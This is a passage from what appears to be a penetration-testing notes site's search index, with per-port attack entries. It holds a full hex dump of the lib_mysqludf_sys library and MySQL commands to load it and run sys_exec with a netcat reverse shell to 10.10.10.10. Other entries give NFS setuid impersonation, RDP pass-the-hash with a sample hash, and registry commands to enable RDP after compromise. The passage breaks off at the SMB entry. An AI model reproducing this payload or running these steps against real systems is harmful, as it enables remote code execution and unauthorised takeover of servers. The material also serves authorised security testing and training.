01000000000000fb00000012000000cf00000000000000700000001200000010010000000000002500000012000000e0000000000000008901000012000000b500000000000000a80200001200000016000000000000000b0100002200000088010000000000007400000012000000fb00000000000000230000001200000080010000040d00006100000012000b00750000003b0a00000500000012000b0010000000f80d00000000000012000c003f010000a10c00002500000012000b001f010000100900000000000012000900c301000008110000000000001000f1ff96000000470a00000500000012000b0070010000ee0c00001600000012000b00cf01000010110000000000001000f1ff56000000310a00000500000012000b00020100009c0b00003000000012000b00a30100007d0d00003e00000012000b00390000002c0a00000500000012000b00320100006b0c00003600000012000b00bc01000008110000000000001000f1ff65000000360a00000500000012000b0025010000fc0b00006f00000012000b0085000000400a00000700000012000b0017010000cc0b00003000000012000b0055010000c60c00002800000012000b00a90000004c0a00008800000012000b008f010000650d00001800000012000b00d7000000d40a0000c800000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000474c4942435f322e310000000200030003000000000003000300030003000300030003000300030003000400030002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000300b20100001000000000000000731f690900000400d4010000100000001069690d00000300e0010000100000001169690d00000200ea01000000000000040b000008000000b70b000008000000e70b000008000000110c000008000000220c000008000000550c0000080000008e0c000008000000ac0c000008000000d90c00000800000004110000080000006b0a0000020f00007c0a000002030000960a000002020000ad0a000002090000430b000002090000bc0a0000020c0000e40a0000020e0000f30a0000020e00003f0c0000020e00000e0b000002010000310b000002060000560b0000020a0000680b000002120000bf0b0000020d0000ef0b0000020d00005b0c0000020d0000960c0000020d0000b20c0000020d0000e10c0000020d0000fd0c000002080000580d000002110000770d0000020b00008e0d000002070000e410000006040000e810000006050000ec10000006100000fc1000000704000000110000071000005589e55383ec04e8000000005b81c3d40700008b93f4ffffff85d27405e81e000000e8b9000000e884040000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8ad00000081c37607000083ec1080bb1800000000755d8b83fcffffff85c0740e8b8314000000890424e8bcffffff8b8b1c0000008d831cffffff8d9318ffffff29d0c1f8028d70ff39f173208db6000000008d410189831c000000ff948318ffffff8b8b1c00000039f172e6c683180000000183c4105b5e5dc35589e553e82e00000081c3f706000083ec048b9320ffffff85d274158b93f8ffffff85d2740b8d8320ffffff890424ffd283c4045b5dc38b1c24c3905589e55dc35589e55dc35589e55dc35589e55dc35531c089e55dc35589e55dc35589e557565383ec0cfc83c9ff8b750c8b46088b3831c0f2aef7d18d59ffe8fcffffff83f8007c53753f83ec0c6a1ee8fcffffff5f596a006a00486a218d1418f7d06a0721d0506a00e8fcffffff83c42083f8ff89c7742351538b4608ff3057e8fcffffffffd7eb0b526a016a0050e8fcffffff31c083c410eb05b8010000008d65f45b5e5f5dc35589e557565383ec18fc6800040000e8fcffffffc70424010000008945e8e8fcffffffc6000089c68b450c595b31db68840e00008b4008ff30e8fcffffff8945eceb338b7de831c083c9fff2ae5252f7d18d79ff8d043b50568945f0e8fcffffff83c40c57ff75e889c68d041850e8fcffffff8b5df083c40cff75ec6a04ff75e8e8fcffffff83c41085c075b683ec0cff75ece8fcffffff83c410803e0075088b4518c60001eb16c6441eff0031c083c9ff89f7f2ae8b4514f7d14989088d65f489f05b5e5f5dc35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e55383ec048b550c8b5d10833a0274095050683f0e0000eb428b420483380074095050685e0e0000eb318b520c83ec0cc74004000000008b0283c00203420450e8fcffffff8b550883c41089420c31d285c07512505068860e000053e8fcffffffb20183c41088d08b5dfcc9c35589e583ec088b450c83380175128b4004833800750a8b4508c6000131c0eb14505068140e0000ff7510e8fcffffffb00183c410c9c35589e55383ec0c8b5d1068a00e000053e8fcffffff8b4514c7001e00000089d88b5dfcc9c35531d289e583ec088b450c8338007414525268bf0e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec148b450c8b4008ff30e8fcffffffc999c35589e557565383ec10fc8b550c8b45088b580c8b420c89df8b088d440b018945e88b42088b30f3a48b420c8b00c60403008b42088b4a0c8b7de88b70048b4904f3a48b420c8b55e88b4004c60402006a015253e8fcffffff8d65f45b5e5f5d99c35589e58b45088b400c85c074098945085de9fcffffff5dc35589e55783ec10fc8b450c8b4008ff30e8fcffffff83c41085c089c275088b4518c60001eb1131c083c9ff89d7f2ae8b4514f7d149890889d08b7dfcc9c390909090905589e55653e85dfcffff81c3260300008b8310ffffff83f8ff74198db310ffffff8db4260000000083ee04ffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c3ec020000e860fbffff595bc9c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff00000000ffffffff000000000000000001000000b20100000c000000100900000d000000f80d000004000000b4000000f5feff6ff8010000050000005805000006000000b80200000a000000f40100000b0000001000000003000000f010000002000000100000001400000011000000170000000009000011000000e0070000120000002001000013000000080000001600000000000000feffff6fa0070000ffffff6f01000000f0ffff6f4c070000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000141000000000000000000000560900006609000004110000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000b4000000b400000044010000030000000000000004000000040000000b000000f6ffff6f02000000f8010000f8010000c000000003000000000000000400000004000000150000000b00000002000000b8020000b8020000a0020000040000000100000004000000100000001d00000003000000020000005805000058050000f40100000000000000000000010000000000000025000000ffffff6f020000004c0700004c070000540000000300000000000000020000000200000032000000feffff6f02000000a0070000a00700004000000004000000010000000400000000000000410000000900000002000000e0070000e007000020010000030000000000000004000000080000004a0000000900000002000000000900000009000010000000030000000a0000000400000008000000530000000100000006000000100900001009000030000000000000000000000004000000000000004e000000010000000600000040090000400900003000000000000000000000000400000004000000590000000100000006000000700900007009000088040000000000000000000010000000000000005f0000000100000006000000f80d0000f80d00001c00000000000000000000000400000000000000650000000100000032000000140e0000140e0000dd000000000000000000000001000000010000006d0000000100000002000000f40e0000f40e00000400000000000000000000000400000000000000770000000100000003000000001000000010000008000000000000000000000004000000000000007e000000010000000300000008100000081000000800000000000000000000000400000000000000850000000100000003000000101000001010000004000000000000000000000004000000000000008a00000006000000030000001410000014100000d000000004000000000000000400000008000000930000000100000003000000e4100000e41000000c00000000000000000000000400000004000000980000000100000003000000f0100000f01000001400000000000000000000000400000004000000a1000000010000000300000004110000041100000400000000000000000000000400000000000000a7000000080000000300000008110000081100000800000000000000000000000400000000000000ac000000010000000000000000000000081100009b0000000000000000000000010000000000000001000000030000000000000000000000a3110000b500000000000000000000000100000000000000 64 bits: x64 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 Exploitation Configurate the server with the following commands. set @shell = 0x7f454c46020101000000000000000000.....00000000; select @@plugin_dir; select binary @shell into dumpfile ' usr lib mysql plugin udf_sys_exec.so'; create function sys_exec returns int soname 'udf_sys_exec.so'; select * from mysql.func where name='sys_exec'; Execute code using the sys_exec function. select sys_exec('nc -e bin bash 10.10.10.10 443'); *https: www.exploit-db.com exploits 46249"
					}

					
				
			
		
			
				
					,
					

					"services-nfs": {
						"id": "services-nfs",
						"title": "PORT 2049/tcp - NFS",
						"category": "",
						"url": " /services/nfs/",
						"content": "Network File System is a distributed file system protocol originally developed by Sun Microsystems in 1984, allowing a user on a client computer to access files over a computer network much like local storage is accessed. Enumeration showmount gives us the opportunity to know which folder are available for us. showmount -e &lt;IP&gt; Mounting the folder We can mount the folder with mount command. mount -t nfs [-o vers=2] &lt;IP&gt;:&lt;NFS_FOLDER&gt; &lt;LOCAL_FOLDER&gt; -o nolock Configuration The file etc exports show the NFS configuration applied on the server. $ cat etc exports var nfsshare *(rw,sync,root_squash,no_all_squash) opt *(rw,sync,root_squash,no_all_squash rw: Means that we can read and write any file on the share. root_squash (default): Maps all the requests from UID GID 0 to the anonymous UID GID. no_root_squash: All requests from UID GID 0 are not mapped to the anonymous UID GID. no_all_squash (default): Not map all the requests from other UID GID to the anonymous UID GID . Note: If we have access to the server and a NFS share has this configuration, we can impersonate any user on the attack machine except for the root user. Impersonate a User (No Root) So what we’ll do is add the user frank (user to impersonate) on our kali machine and change his id to 1000 (Assigned on the target). ❯ useradd frank ❯ cat etc passwd | grep frank frank:x:1000:1000:: home frank: bin sh Note: You can change any ID by modifying the etc passwd file. Next step is create a setuid.c file: #include &lt;unistd.h&gt; int main() { setreuid(1000,1000); execl(\" bin bash\", \"bash\", (char *)NULL); return 0; } Then compile it: gcc setuid.c -o setuid Set the sticky bit on the file: chmod u+s setuid And execute it on the target machine. References https: book.hacktricks.xyz pentesting nfs-service-pentesting https: ethicalhackingguru.com how-to-enumerate-and-exploit-nfs-shares"
					}

					
				
			
		
			
				
					,
					

					"services-rdp": {
						"id": "services-rdp",
						"title": "PORT 3389/tcp - RDP",
						"category": "",
						"url": " /services/rdp/",
						"content": "Introduction Remote Desktop Protocol is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection. The user employs RDP client software for this purpose, while the other computer must run RDP server software Enumeration With nmap we can enumerate the service a little bit, and obtain information such as the DOMAIN or the HOSTNAME. Also checks available encryption and DoS vulnerabilities. nmap -sV --script \"rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info\" -p 3389 &lt;ip-addr&gt; Checking Credentials With rdp_check we can check credentials. rdp_check &lt;domain&gt; &lt;username&gt;:&lt;password&gt;@&lt;ip-addr&gt; Connect via RDP rdesktop rdesktop &lt;ip-addr&gt; rdesktop -u &lt;user&gt; -p &lt;password&gt;&lt;ip-addr&gt; rdesktop -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; &lt;ip-addr&gt; xfreerdp xfreerdp is an X11 Remote Desktop Protocol (RDP) client which is part of the FreeRDP project. An RDP server is built-in to many editions of Windows. Alternative servers included xrdp and VRDP (VirtualBox). xfreerdp d:&lt;domain&gt; u:&lt;user&gt; p:&lt;password&gt; v:10.10.10.10 xfreerdp u:&lt;user&gt; p:&lt;password&gt; v:10.10.10.10 Connect RDP via pass the hash. xfreerdp u:&lt;user&gt; pth:e3071bcf8c3ad25c891a8898f56aa62b v:10.10.10.10 Other configurations. workarea Full Window +clipboard Enable shared clipboard drive:share, mnt folder Create a Shared folder Post Exploitation With mimikatz is possible to obtain the current sessions and connect it. Check section **Hijacking RDP Session ** to more info. Get Credentials Enable RDP When we fully compromised the server we can enable RDP. reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" v fDenyTSConnections t REG_DWORD d 0 f And add the user or group to the Remote Desktop Users group. net localgroup “remote desktop users” user add"
					}

					
				
			
		
			
				
					,
					

					"services-rpcbind": {
						"id": "services-rpcbind",
						"title": "PORT 111/tcp - RPCBind",
						"category": "",
						"url": " /services/rpcbind/",
						"content": "Provides information between Unix based systems. Port is often probed, it can be used to fingerprint the Nix OS, and to obtain information about available services. Port used with NFS, NIS or others.. Enumeration We can enumerate RPCBind service with rpcinfo or nmap: rpcinfo ip-addr nmap -sSUC -p 111 ip-addr Example output of rpcinfo: program version netid address service owner 100000 4 tcp6 ::.0.111 portmapper superuser 100000 3 tcp6 ::.0.111 portmapper superuser 100000 4 udp6 ::.0.111 portmapper superuser 100000 3 udp6 ::.0.111 portmapper superuser 100000 4 tcp 0.0.0.0.0.111 portmapper superuser 100000 3 tcp 0.0.0.0.0.111 portmapper superuser 100000 2 udp 0.0.0.0.0.111 portmapper superuser 100000 4 local run rpcbind.sock portmapper superuser 100000 3 local run rpcbind.sock portmapper superuser 100005 1 udp 0.0.0.0.128.213 mountd superuser 100005 1 tcp 0.0.0.0.208.235 mountd superuser 100005 1 udp6 ::.163.28 mountd superuser 100005 1 tcp6 ::.183.211 mountd superuser 100005 2 udp 0.0.0.0.190.193 mountd superuser 100005 2 tcp 0.0.0.0.188.127 mountd superuser 100005 2 udp6 ::.233.215 mountd superuser 100005 2 tcp6 ::.165.45 mountd superuser 100005 3 udp 0.0.0.0.130.78 mountd superuser 100005 3 tcp 0.0.0.0.148.209 mountd superuser 100005 3 udp6 ::.150.143 mountd superuser 100005 3 tcp6 ::.217.45 mountd superuser 100003 2 tcp 0.0.0.0.8.1 nfs superuser 100003 3 tcp 0.0.0.0.8.1 nfs superuser 100003 4 tcp 0.0.0.0.8.1 nfs superuser 100227 2 tcp 0.0.0.0.8.1 - superuser 100227 3 tcp 0.0.0.0.8.1 - superuser 100003 2 udp 0.0.0.0.8.1 nfs superuser 100003 3 udp 0.0.0.0.8.1 nfs superuser 100003 4 udp 0.0.0.0.8.1 nfs superuser 100227 2 udp 0.0.0.0.8.1 - superuser 100227 3 udp 0.0.0.0.8.1 - superuser 100003 2 tcp6 ::.8.1 nfs superuser 100003 3 tcp6 ::.8.1 nfs superuser 100003 4 tcp6 ::.8.1 nfs superuser 100227 2 tcp6 ::.8.1 - superuser 100227 3 tcp6 ::.8.1 - superuser 100003 2 udp6 ::.8.1 nfs superuser 100003 3 udp6 ::.8.1 nfs superuser 100003 4 udp6 ::.8.1 nfs superuser 100227 2 udp6 ::.8.1 - superuser 100227 3 udp6 ::.8.1 - superuser 100021 1 udp 0.0.0.0.167.136 nlockmgr superuser 100021 4 tcp 0.0.0.0.174.121 nlockmgr superuser 100021 1 udp6 ::.164.129 nlockmgr superuser 100021 1 tcp6 ::.130.83 nlockmgr superuser NFS If you find the service NFS then probably you will be able to list and download(and maybe upload) files: nmap -p 2049 -sV --script nfs-\\* ip-addr showmount -e ip-addr After finding the nfs folder we can mount these shares in our filesystem: sudo mount -o nolock -t nfs [-o vers=2] &lt;ip-addr&gt;:&lt;remote_folder&gt; &lt;local_folder&gt; NFS Service References: https: docs.oracle.com cd E56339_01 html E53865 gntib.html https: book.hacktricks.xyz pentesting nfs-service-pentesting https: book.hacktricks.xyz pentesting pentesting-rpcbind"
					}

					
				
			
		
			
				
					,
					

					"services-smb": {
						"id": "services-smb",
						"title": "PORT 139/tcp, 445/tcp - SMB",
						"category": "",
						"url": " /services/smb/",
